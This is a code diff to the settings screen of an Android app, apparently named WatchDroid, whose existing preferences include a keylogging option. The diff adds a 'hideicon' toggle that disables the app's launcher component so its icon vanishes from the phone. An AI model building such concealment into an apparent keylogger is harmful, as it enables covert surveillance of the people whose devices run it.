@@ -1,10 +1,13 @@
 package com.watchdroid;
 
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.preference.CheckBoxPreference;
 import android.preference.Preference;
+import android.widget.Toast;
 
 import com.arx_era.watchdroid.R;
 import com.github.machinarius.preferencefragment.PreferenceFragment;
@@ -30,6 +33,7 @@ public class Settings extends PreferenceFragment {
         final SharedPreferences.Editor editor = pref.edit();
         final Boolean keylogging = pref.getBoolean("keylogging", Boolean.parseBoolean(null));
         final Boolean keypassonoff = pref.getBoolean("keypassonoff", Boolean.parseBoolean(null));
+
 
         CheckBoxPreference boot = (CheckBoxPreference) getPreferenceManager().findPreference("boot");
         boot.setChecked(keylogging);
@@ -60,6 +64,26 @@ public class Settings extends PreferenceFragment {
                 else {
                     editor.putBoolean("keypassonoff", false   );
                     editor.commit();
+                }
+                return true;
+            }
+        });
+        CheckBoxPreference iconhide = (CheckBoxPreference) getPreferenceManager().findPreference("hideicon");
+        iconhide.setChecked(keypassonoff);
+        iconhide.setOnPreferenceChangeListener(new Preference.OnPreferenceChangeListener() {
+            public boolean onPreferenceChange(Preference preference, Object newValue) {
+                Boolean cbv = (Boolean) newValue;
+                if(cbv) {
+                    //hide
+                    PackageManager p = getActivity().getPackageManager();
+                    ComponentName componentName= new ComponentName(getActivity(), com.watchdroid.SplashScreen.class);
+                    p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+                    Toast.makeText(getActivity().getApplicationContext(), "Hello", Toast.LENGTH_SHORT).show();
+                }
+                else {
+                    PackageManager p = getActivity().getPackageManager();
+                    ComponentName componentName = new ComponentName(getActivity(), com.watchdroid.SplashScreen.class);
+                    p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
                 }
                 return true;
             }
